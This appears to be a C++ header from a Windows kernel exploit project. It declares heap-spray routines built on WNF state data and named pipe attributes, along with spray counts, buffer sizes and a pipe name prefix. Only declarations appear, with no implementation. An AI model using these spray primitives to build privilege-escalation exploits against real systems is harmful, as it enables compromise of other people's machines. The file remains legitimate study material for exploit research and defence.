#pragma once
#ifndef SPRAY_H
#define SPRAY_H

#include <ntstatus.h>
#include <time.h>
#include <vector>
#include "head.h"
#include "windows_api.h"
#include <Windows.h>
#include "ntos.h"
#define SPRAY_NUM 0x1000  
#define NUM_WNDPADSPRAY 0x1000
#define NUM_WNFSTATEDATA 0x1000 
#define WNF_MAXBUFSIZE 0x1000 

#define WNF_MAXBUFSIZE2 0x700
#define NUM_WNDPADSPRAY2 0xf000
#define NUM_WNFSTATEDATA2 0x5000 

#define PIPE_NAME_PREFIX L"\\\\.\\pipe\\spraypipe_"
extern std::vector<PIPE> pipeHandles;
extern IO_STATUS_BLOCK statusBlock;
VOID sprayPipeAttributes();
VOID sprayWNF(WNF_STATE_NAME PadStateNames[], WNF_STATE_NAME StateNames[], BYTE c);
VOID sprayWNF2(WNF_STATE_NAME PadStateNames[], WNF_STATE_NAME StateNames[]);
extern WNF_STATE_NAME PadStateNames1[NUM_WNDPADSPRAY];
extern WNF_STATE_NAME StateNames1[NUM_WNFSTATEDATA];
extern WNF_STATE_NAME PadStateNames2[NUM_WNDPADSPRAY];
extern WNF_STATE_NAME StateNames2[NUM_WNFSTATEDATA];
extern WNF_STATE_NAME PadStateNames3[NUM_WNDPADSPRAY2];
extern WNF_STATE_NAME StateNames3[NUM_WNFSTATEDATA2];
VOID freeWNF(WNF_STATE_NAME PadStateNames[], WNF_STATE_NAME StateNames[]);
#endif // SPRAY_H